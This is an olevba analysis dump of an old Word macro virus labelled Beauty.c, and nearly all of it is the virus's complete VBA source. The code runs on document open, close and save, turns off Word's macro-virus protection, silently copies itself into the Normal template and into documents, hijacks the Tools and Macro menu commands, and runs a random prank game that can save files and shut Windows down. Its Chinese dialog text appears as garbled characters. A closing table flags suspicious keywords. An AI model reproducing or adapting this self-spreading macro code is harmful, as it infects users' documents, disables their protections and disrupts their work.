olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Beauty.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument 
in file: Virus.MSWord.Beauty.c - OLE stream: 'ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Beauty.c - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Beauty2 
in file: Virus.MSWord.Beauty.c - OLE stream: 'Beauty2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoClose()
Dim nor$
Dim fn$
Dim con
Dim c
Dim ca
Dim con1
Dim cc
Dim ca1
On Error Resume Next

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo dlg
nor$ = dlg.Template
fn$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 1)

con = WordBasic.CountAutoTextEntries(0)
If con > 0 Then
   For c = 1 To con
      If WordBasic.[AutoTextName$](c, 0) = "lamo" Then ca = 1
   Next c
End If
If ca <> 1 Then

 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="lamo", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p1", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p2", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p3", Tab:=1

End If

On Error Resume Next
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Beauty2" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "Beauty2" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Beauty2", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
        
       
    End If

con1 = WordBasic.CountAutoTextEntries(1)
If con1 > 0 Then
  For cc = 1 To con1
     If WordBasic.[AutoTextName$](cc, 1) = "lamo" Then ca1 = 1
  Next cc
End If
If ca1 <> 1 Then
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="lamo", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p1", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p2", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p3", Tab:=1
End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Beauty2", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
        
     

End If
Application.DisplayAlerts = wdAlertsAll

WordBasic.DocClose 1

If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Then
WordBasic.Call "game"
End If


exit_:
End Sub
Sub FileClose()
Dim nor$
Dim fn$
Dim con
Dim c
Dim ca
Dim con1
Dim cc
Dim ca1
On Error Resume Next

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo dlg
nor$ = dlg.Template
fn$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 1)

con = WordBasic.CountAutoTextEntries(0)
If con > 0 Then
   For c = 1 To con
      If WordBasic.[AutoTextName$](c, 0) = "lamo" Then ca = 1
   Next c
End If
If ca <> 1 Then

 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="lamo", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p1", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p2", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p3", Tab:=1

End If

On Error Resume Next
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Beauty2" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "Beauty2" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Beauty2", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
        
       
    End If

con1 = WordBasic.CountAutoTextEntries(1)
If con1 > 0 Then
  For cc = 1 To con1
     If WordBasic.[AutoTextName$](cc, 1) = "lamo" Then ca1 = 1
  Next cc
End If
If ca1 <> 1 Then
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="lamo", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p1", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p2", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p3", Tab:=1
End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Beauty2", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
        
     

End If
Application.DisplayAlerts = wdAlertsAll

WordBasic.DocClose 1

If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Then
WordBasic.Call "game"
End If


exit_:

End Sub
Sub AutoOpen()
Dim nor$
Dim fn$
Dim con
Dim c
Dim ca
Dim con1
Dim cc
Dim ca1
On Error Resume Next

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo dlg
nor$ = dlg.Template
fn$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 1)

con = WordBasic.CountAutoTextEntries(0)
If con > 0 Then
   For c = 1 To con
      If WordBasic.[AutoTextName$](c, 0) = "lamo" Then ca = 1
   Next c
End If
If ca <> 1 Then

 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="lamo", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p1", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p2", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p3", Tab:=1

End If

On Error Resume Next
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Beauty2" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "Beauty2" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Beauty2", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
        
       
    End If

con1 = WordBasic.CountAutoTextEntries(1)
If con1 > 0 Then
  For cc = 1 To con1
     If WordBasic.[AutoTextName$](cc, 1) = "lamo" Then ca1 = 1
  Next cc
End If
If ca1 <> 1 Then
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="lamo", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p1", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p2", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p3", Tab:=1
End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Beauty2", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
        
     

End If
Application.DisplayAlerts = wdAlertsAll

If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Then
WordBasic.Call "game"
End If


exit_:

End Sub

Sub FileSave()
Dim nor$
Dim fn$
Dim con
Dim c
Dim ca
Dim con1
Dim cc
Dim ca1
On Error Resume Next

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo dlg
nor$ = dlg.Template
fn$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 1)

con = WordBasic.CountAutoTextEntries(0)
If con > 0 Then
   For c = 1 To con
      If WordBasic.[AutoTextName$](c, 0) = "lamo" Then ca = 1
   Next c
End If
If ca <> 1 Then

 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="lamo", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p1", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p2", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p3", Tab:=1

End If

On Error Resume Next
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Beauty2" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "Beauty2" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Beauty2", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
        
       
    End If

con1 = WordBasic.CountAutoTextEntries(1)
If con1 > 0 Then
  For cc = 1 To con1
     If WordBasic.[AutoTextName$](cc, 1) = "lamo" Then ca1 = 1
  Next cc
End If
If ca1 <> 1 Then
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="lamo", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p1", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p2", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p3", Tab:=1
End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Beauty2", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
        
     

End If
Application.DisplayAlerts = wdAlertsAll

WordBasic.DocClose 1

If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Then
WordBasic.Call "game"
End If


exit_:

End Sub

Sub GAME()
Dim R
Dim num
Dim ANS
R = 1
WordBasic.BeginDialog 478, 216, "¬ü ¤k ®± 2 for Word97"
    WordBasic.Picture 10, 6, 238, 199, "p3", 1, "Picture1"
    WordBasic.Text 266, 8, 194, 13, "¶Ù ! ©M §Ú ²q ­Ó ®± §a!!", "Text1"
    WordBasic.Text 266, 27, 193, 13, "²q Ä¹ ´N Åý §A ¬Ý ºë ±m ªº !!", "Text2"
    WordBasic.Text 266, 46, 184, 13, "´N ºâ ¬O ²q ¿é ¤F !!", "Text3"
    WordBasic.Text 266, 65, 190, 13, "§O ©È !! µ´ ¤£ ·| ¶Ë §A ªº", "Text4"
    WordBasic.Text 266, 84, 190, 13, "Ä_ ¨© ¹q ¸£ ¤@ ¤À ¤@ ²@ ªº !! ", "Text5"
    WordBasic.Text 266, 103, 190, 13, "©ñ ¤ß ª± §a !", "Text6"
    WordBasic.PushButton 268, 122, 195, 21, "¨º§Ú¥X°Å¤M¦n¤F!!", "Push1"
    WordBasic.PushButton 268, 151, 195, 21, "¨º§Ú¥X¥ÛÀY¦n¤F!!", "Push2"
    WordBasic.PushButton 268, 183, 195, 21, "¨º§Ú¥X¥¬¦n¤F!!", "Push3"
WordBasic.EndDialog

guessgame:
Dim gdh As Object: Set gdh = WordBasic.CurValues.UserDialog
num = WordBasic.Int(Rnd() * 5) + 1
ANS = WordBasic.Dialog.UserDialog(gdh)
If num >= 4 Then
recall
GoTo guessgame

End If
If ANS = num Then
WordBasic.MsgBox "§O  °ª  ¿³ !! §Ú  ¬O  ¬Ý  §A  ¥i  ¼¦ ¡A ¤~  ¬G  ·N  ¿é  §A  ªº !!", "¬ü ¤k ®± 2 for Word97", 64
GoTo exit_
End If
WordBasic.Beep
WordBasic.MsgBox "»¹  ÀÅ  ¤F !! ­n  ¤£  ­n  §Ú  Åý  §A  ¤@  §â  £« ??", "¬ü ¤k ®± 2 for Word97", 64
R = R + 1
If R <= 5 Then
GoTo guessgame
End If

WordBasic.MsgBox "¨S  ¨£  ¹L  ¹³  §A  ³o  ¼Ë  ÚÄ  ªº  ¤H  !!  ¤p  ©j  §Ú  ¤£  ³­  §A  ¯Ó  ¤F !!", "¬ü ¤k ®± 2 for Word97", 64
WordBasic.ExitWindows

exit_:
guess1
End Sub

Private Sub guess1()
Dim R
Dim num
Dim ANS
R = 1
WordBasic.BeginDialog 478, 216, "¬ü ¤k ®± 2 for Word97 "
    WordBasic.Picture 10, 6, 238, 199, "lamo", 1, "Picture1"
    WordBasic.Text 266, 8, 194, 13, "«e­±¤@Ãö¬O¬G·N©ñ¤ôªº!!", "Text1"
    WordBasic.Text 266, 27, 193, 13, "³o¦^±o¬Ý§Aªº¯u¥»¨Æ°Õ!!", "Text2"
    WordBasic.Text 266, 46, 184, 13, "¬Ý§Aªº¦n¹B¯à«ùÄò¦h¤[?", "Text3"
    WordBasic.Text 266, 65, 190, 13, "±M¤ßÂI!!", "Text4"
    WordBasic.Text 266, 84, 190, 13, "¥i§O¿é±o¤ÓÃø¬Ý³á!!", "Text5"
    WordBasic.Text 266, 103, 190, 13, "§Úªº§Þ³N¥i¬O¤@¬yªº³á!!", "Text6"
    WordBasic.PushButton 268, 122, 195, 21, "¨º§Ú¥X°Å¤M¦n¤F!!", "Push1"
    WordBasic.PushButton 268, 151, 195, 21, "¨º§Ú¥X¥ÛÀY¦n¤F!!", "Push2"
    WordBasic.PushButton 268, 183, 195, 21, "¨º§Ú¥X¥¬¦n¤F!!", "Push3"
WordBasic.EndDialog

guessgame:
Dim gdh As Object: Set gdh = WordBasic.CurValues.UserDialog
num = WordBasic.Int(Rnd() * 7) + 1
ANS = WordBasic.Dialog.UserDialog(gdh)
If num >= 6 Then
recall
GoTo guessgame

End If

If ANS = num Then
WordBasic.MsgBox "®ð  ¦º  ¤H  ¤F !! §A  ªº  ¹B  ®ð  «ç  »ò  ³o  »ò  ¦n  ?", "¬ü ¤k ®± 2 for Word97", 64
GoTo exit_
End If
WordBasic.Beep
WordBasic.MsgBox "¦^  ¥h  ¦Y  ¥¤  §a !! ¨Å  ¯ä  ¥¼  °®  ªº  ¤p  ¤l !!", "¬ü ¤k ®± 2 for Word97", 64
R = R + 1
If R <= 5 Then
GoTo guessgame
End If

WordBasic.MsgBox "¤Ñ  ¦r  ²Ä  ¤@  ¸¹  ¤j  ¥Õ  Ã¨ !!!! ¹L  ¨Ó  »Q  §Ú  ªº  ¸}  ³k  ÀY  §a !!", "¬ü ¤k ®± 2 for Word97", 64
WordBasic.ExitWindows


exit_:
guess2
End Sub

Private Sub guess2()
Dim R
Dim num
Dim ANS
R = 1
WordBasic.BeginDialog 478, 216, "¬ü ¤k ®± 2 for Word97"
    WordBasic.Picture 10, 6, 238, 199, "p1", 1, "Picture1"
    WordBasic.Text 266, 8, 194, 13, "¤£Â²³æ³á!¯à³sÂô¨âÃö!", "Text1"
    WordBasic.Text 266, 27, 193, 13, "ªGµM¬O­Ó¤¤°ª¤â!!", "Text2"
    WordBasic.Text 266, 46, 184, 13, "¦ý¡A§A¥i§O·Q»´©ö¹L§Ú", "Text3"
    WordBasic.Text 266, 65, 190, 13, "³o¤@Ãö!!£°!!£°!!«ô°U", "Text4"
    WordBasic.Text 266, 84, 190, 13, "§â±¾¦b¼L¨¤ªº¤f¤ôÀ¿¤@À¿!!", "Text5"
    WordBasic.Text 266, 103, 190, 13, "³o¼Ë«ÜÃø¬Ý­C!!", "Text6"
    WordBasic.PushButton 268, 122, 195, 21, "¨º§Ú¥X°Å¤M¦n¤F!!", "Push1"
    WordBasic.PushButton 268, 151, 195, 21, "¨º§Ú¥X¥ÛÀY¦n¤F!!", "Push2"
    WordBasic.PushButton 268, 183, 195, 21, "¨º§Ú¥X¥¬¦n¤F!!", "Push3"
WordBasic.EndDialog

guessgame:
Dim gdh As Object: Set gdh = WordBasic.CurValues.UserDialog
num = WordBasic.Int(Rnd() * 15) + 1
ANS = WordBasic.Dialog.UserDialog(gdh)
If num >= 12 Then
recall
GoTo guessgame

End If

If ANS = num Then
WordBasic.MsgBox "³Þ !! §A  ¦³  §@  ¹ú  ªº  ¶û  ºÃ  ³á !!", "¬ü ¤k ®± 2 for Word97", 64
GoTo exit_
End If
WordBasic.Beep
WordBasic.MsgBox "³Þ !! §A   ÁÙ   ¨S   ºÎ   ¿ô   £« ????", "¬ü ¤k ®± 2 for Word97", 64
R = R + 1
If R <= 5 Then
GoTo guessgame
End If

WordBasic.MsgBox "Äî  ½¼  Á°  ·Q  ¦Y  ¤Ñ  ÃZ  ¦×  !! ÁÙ  ¦­  µÛ  ©O  !! ¤@  Ãä  ²D  §Ö  ¥h !!", "¬ü ¤k ®± 2 for Word97", 64
WordBasic.ExitWindows

exit_:
guess3
End Sub

Private Sub guess3()
Dim num
Dim ANS
WordBasic.BeginDialog 478, 216, "¬ü ¤k ®± 2 for Word97"
    WordBasic.Picture 10, 6, 238, 199, "p2", 1, "Picture1"
    WordBasic.Text 266, 8, 194, 13, "¤@¸ô¹LÃö±Ù±N!¯u¦³§Aªº!!", "Text1"
    WordBasic.Text 266, 27, 193, 13, "³o¬O³Ì«á¤@Ãö!!¦³¥»¨ÆÄ¹§Ú", "Text2"
    WordBasic.Text 266, 46, 184, 13, "´NÅý§A¬Ýºë±mªº!!", "Text3"
    WordBasic.Text 266, 65, 190, 13, "¿é¤F!!¤]¨SÔ£¤j¤£¤Fªº!!", "Text4"
    WordBasic.Text 266, 84, 190, 13, "¥u©Ç§A§Þ³N¤ÓÄê!!", "Text5"
    WordBasic.Text 266, 103, 190, 13, "Ëç!!§A«ç»ò¬y»ó¦å¤F??", "Text6"
    WordBasic.PushButton 268, 122, 195, 21, "¨º§Ú¥X°Å¤M¦n¤F!!", "Push1"
    WordBasic.PushButton 268, 151, 195, 21, "¨º§Ú¥X¥ÛÀY¦n¤F!!", "Push2"
    WordBasic.PushButton 268, 183, 195, 21, "¨º§Ú¥X¥¬¦n¤F!!", "Push3"
WordBasic.EndDialog

guessgame:
Dim gdh As Object: Set gdh = WordBasic.CurValues.UserDialog
num = WordBasic.Int(Rnd() * 10) + 1
ANS = WordBasic.Dialog.UserDialog(gdh)
If num >= 6 Then
recall
GoTo guessgame

End If

If ANS = num Then
WordBasic.MsgBox "°Q  ¹½  °Õ  !! ­è  ¤~  ¨º  ¤@  ®±  ¤£  ºâ  °Õ  !!", "¬ü ¤k ®± 2 for Word97", 64
GoTo exit_
End If
WordBasic.Beep
WordBasic.MsgBox "£° !! §Ú   Ä¹  ¤F!! ³o  ¥s  ¹ê  ¤O  !! §A   À´  ¤£  À´  £«??", "¬ü ¤k ®± 2 for Word97", 64
GoTo guessgame



exit_:
On Error Resume Next
WordBasic.FileNewDefault
WordBasic.CenterPara
WordBasic.FormatFont Points:=64, Underline:=1, Color:=6, Bold:=1
WordBasic.Insert "Ëç!!¤j½Þ­ô!!¨S°Õ!!Ãø¨ì§AÁÙ·Q¬Ý­­¨î¯Åªº£«????"
WordBasic.FileSaveAll
WordBasic.DocClose 1
WordBasic.ExitWindows

End Sub

Private Sub recall()

ANS:
Dim RE
RE = WordBasic.Int(Rnd() * 10)
If RE > 7 Or RE < 1 Then GoTo ANS

If RE = 1 Then
WordBasic.Beep
WordBasic.MsgBox "¦n   §a !!  ³o   ¦^   ¥­   ¤â ! ¦A  ²q  ¤@  ®±  §a !! ", "¬ü ¤k ®± 2 for Word97", 64
K = 1
End If

If RE = 2 Then
WordBasic.Beep
WordBasic.MsgBox "·d  ¤°  »ò  ¹À !! ³º   µM   ¨S   ¦³   ¿é   Ä¹ !!", "¬ü ¤k ®± 2 for Word97", 64
End If

If RE = 3 Then
WordBasic.Beep
WordBasic.MsgBox "©Ç  ©Ç !!!! §A  ­A  ¶B  ³á  ?!", "¬ü ¤k ®± 2 for Word97", 64
End If

If RE = 4 Then
WordBasic.Beep
WordBasic.MsgBox "¤£  ¥i  ¯à  §a !! ¦³  ¥»  ¨Æ  ¤U  ¤@  ®±  Ä¹  §Ú !!", "¬ü ¤k ®± 2 for Word97", 64
End If

If RE = 5 Then
WordBasic.Beep
WordBasic.MsgBox "£°..............!!  ³o   «Ü   ¨¸   ªù   ³á !! ", "¬ü ¤k ®± 2 for Word97", 64
End If

If RE = 6 Then
WordBasic.Beep
WordBasic.MsgBox "­ó !! ¤@  ©w  ¬O  §A  ¦b  ·d  °­¡A ¤£  µM  «ç  »ò  ·|  ³o  ¼Ë !!", "¬ü ¤k ®± 2 for Word97", 64
End If

If RE = 7 Then
WordBasic.Beep
WordBasic.MsgBox "@$#*%#@#!!®³  ¥X  §A  ªº  ¯u  ¥»  ¨Æ  §a!! §O  ¦A  ±Ã  ¤ã  ¤F ", "¬ü ¤k ®± 2 for Word97", 64
End If


End Sub
Sub FileTemplates()
Dim K
'1997.09.08 by gdh
K = WordBasic.Int(Rnd() * 10)
If K >= 8 Then
WordBasic.Call "game"
GoTo bye
End If

exit_:
WordBasic.Beep
WordBasic.MsgBox " °O ¾Ð Åé ¥Î §¹ ", "Microsoft Visual Basic", 48

bye:

End Sub
Sub ToolsMacro()
Dim K
'1997.09.08 by gdh
K = WordBasic.Int(Rnd() * 10)
If K >= 8 Then
WordBasic.Call "game"
GoTo bye
End If

exit_:
WordBasic.Beep
WordBasic.MsgBox " °O ¾Ð Åé ¥Î §¹ ", "Microsoft Visual Basic", 48

bye:

End Sub

Sub viewvbcode()
Dim K
'1997.09.08 by gdh
K = WordBasic.Int(Rnd() * 10)
If K >= 8 Then
WordBasic.Call "game"
GoTo bye
End If

exit_:
WordBasic.Beep
WordBasic.MsgBox " °O ¾Ð Åé ¥Î §¹ ", "Microsoft Visual Basic", 48

bye:


End Sub
Sub ToolsOptions()
Dim K
'1997.09.08 by gdh
K = WordBasic.Int(Rnd() * 10)
If K >= 8 Then
WordBasic.Call "game"
GoTo bye
End If

exit_:
WordBasic.Beep
WordBasic.MsgBox " °O ¾Ð Åé ¥Î §¹ ", "Microsoft Visual Basic", 48

bye:
End Sub
Sub Toolscustomize()
Dim K
'1997.09.08 by gdh
K = WordBasic.Int(Rnd() * 10)
If K >= 8 Then
WordBasic.Call "game"
GoTo bye
End If

exit_:
WordBasic.Beep
WordBasic.MsgBox " °O ¾Ð Åé ¥Î §¹ ", "Microsoft Visual Basic", 48

bye:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

